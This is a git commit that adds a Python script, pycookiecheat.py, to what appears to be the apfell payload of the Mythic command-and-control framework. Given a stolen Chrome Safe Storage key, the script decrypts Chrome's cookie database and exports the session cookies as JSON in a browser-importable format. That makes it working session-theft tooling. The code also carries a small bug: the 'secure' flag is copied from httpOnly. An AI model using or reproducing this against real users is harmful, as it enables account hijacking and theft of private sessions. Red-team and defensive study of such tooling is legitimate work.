6a55b4619b6d67439957c8065bd9a89687e6d0b7
Antonio Piazza <antman1p@gmail.com>
2021-09-15 13:35:07 -0500

    debugging pulling the Chrome Safe Storage key from the keychain dumps

---
+++ Payload_Type/apfell/mythic/pycookiecheat/pycookiecheat.py
@@ -0,0 +1,110 @@
+#!/usr/bin/env python3
+# Taken from https://github.com/n8henrie/pycookiecheat
+import sqlite3
+import os.path
+import base64
+import urllib.parse
+import sys
+import json
+from Crypto.Cipher import AES
+from Crypto.Protocol.KDF import PBKDF2
+import argparse
+
+salt = b'saltysalt'
+iv = b' ' * 16
+length = 16
+
+def decrypt(encrypted_value, key) -> str:
+    """This function decrypts the given value with the provided key"""
+    # Encrypted cookies should be prefixed with 'v10' according to the
+    # Chromium code. Strip it off.
+    encrypted_value = encrypted_value[3:]
+
+    # Strip padding by taking off number indicated by padding
+    # eg if last is '\x0e' then ord('\x0e') == 14, so take off 14.
+    # You'll need to change this function to use ord() for python2.
+    def clean(x):
+        return x[:-x[-1]].decode('utf8')
+
+    cipher = AES.new(key, AES.MODE_CBC, IV=iv)
+    decrypted = cipher.decrypt(encrypted_value)
+
+    return clean(decrypted)
+
+def parse_args() -> dict:
+    """Returns a dict of arguments"""
+    parser = argparse.ArgumentParser()
+
+    parser.add_argument(
+        "--cookies-file",
+        "-c",
+        help="Full path to the cookies db file",
+        required=True
+    )
+
+    parser.add_argument(
+        "--key",
+        "-k",
+        help="Chrome safe storage key",
+        required=True
+    )
+
+    parser.add_argument(
+        "--output",
+        "-o",
+        help="Path of the output json file",
+        required=True
+    )
+
+    args_raw = parser.parse_args()
+    args: dict = vars(args_raw)
+    return args
+
+def main(args: dict) -> None:
+    """This function accepts a path to a Cookies db file and key to decrypt chrome cookies"""
+    cookies_db = args.get("cookies_file")
+    key = args.get("key")
+    out_file = args.get("output")
+
+
+    raw_secret = key.encode('utf8')
+    iterations = 1003
+    # obtain the derived key
+    dk = PBKDF2(raw_secret, salt, length, iterations)
+
+    if os.path.exists(cookies_db):
+        conn = sqlite3.connect(cookies_db)
+        sql = 'select name, value, encrypted_value, path, host_key, expires_utc, is_httponly, samesite, is_secure, priority, last_access_utc, is_persistent, has_expires, source_scheme from cookies '
+
+        cookies = {}
+        cookies_list = []
+
+        with conn:
+            for k, v, ev, path, domain, expirationDate, httpOnly, samesite, secure, priority, last_access, is_persistent, has_expires, source_scheme in conn.execute(sql):
+                temp_val = {"name": k, "value": v, "path": path, "domain": domain, "expirationDate": expirationDate, "httpOnly": httpOnly, "samesite": samesite, "secure": secure, "id": priority, "session": is_persistent, "hostOnly": False, "storeId":"firefox-default", "sameSite":"no_restriction","firstPartyDomain":""}
+                temp_val["httpOnly"] = False if httpOnly == 0 else True
+                temp_val["secure"] = False if httpOnly == 0 else True
+
+                if temp_val["session"] == 1:
+                    temp_val["session"] = False
+                else:
+                    temp_val["session"] = True
+                    # if there is a not encrypted value or if the encrypted value
+                # doesn't start with the 'v10' prefix, return v
+                if v or (ev[:3] != b'v10'):
+                    pass #cookies_list.append((k, v, path, domain, expirationDate, httpOnly, samesite, secure, priority))
+                else:
+                    temp_val['value'] = decrypt(ev, key=dk)
+
+                cookies_list.append(temp_val)
+
+        out = json.dumps(cookies_list, sort_keys=True, indent=4)
+        outfile = open(out_file, 'w')
+        outfile.write(out)
+        outfile.close()
+    else:
+        print("Cookies file doesn't exist")
+
+if __name__ == "__main__":
+    args: dict = parse_args()
+    main(args=args)
